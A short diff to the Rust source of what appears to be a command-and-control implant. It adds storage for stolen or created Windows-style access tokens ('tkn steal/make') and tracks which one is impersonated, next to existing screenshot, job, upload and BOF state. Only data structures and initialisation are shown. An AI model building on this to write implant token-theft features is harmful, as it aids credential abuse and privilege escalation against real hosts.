@@ -79,6 +79,14 @@ pub struct Instance {
     /// Active screenshot stream (one at a time; the BMP lives in a heap
     /// buffer and drains 48 KiB per cycle).
     pub screenshot: Option<crate::tasks::ShotState>,
+    /// Stored tokens (tkn steal/make): the native keeps a heap linked
+    /// list, the instance array matches the jobs pattern.
+    pub tokens: [crate::tasks::TokenEntry; crate::tasks::MAX_TOKENS],
+    pub tokens_len: usize,
+    /// Id of the next stored token (increments per steal/make).
+    pub next_token_id: u32,
+    /// Id of the token currently impersonated (0 = none).
+    pub active_token: u32,
     /// Live jobs (ps run): the process handle, its pid and the stdout
     /// pipe read end. The id is the original task id (the operator kills
     /// by this id).
@@ -389,6 +397,10 @@ unsafe fn bootstrap() -> Option<Instance> {
         jobs_len: 0,
         download: None,
         screenshot: None,
+        tokens: [crate::tasks::TokenEntry::empty(); crate::tasks::MAX_TOKENS],
+        tokens_len: 0,
+        next_token_id: 0,
+        active_token: 0,
         upload: None,
         bof_pending: None,
         // The handle opened at the very top of the bootstrap carries over.
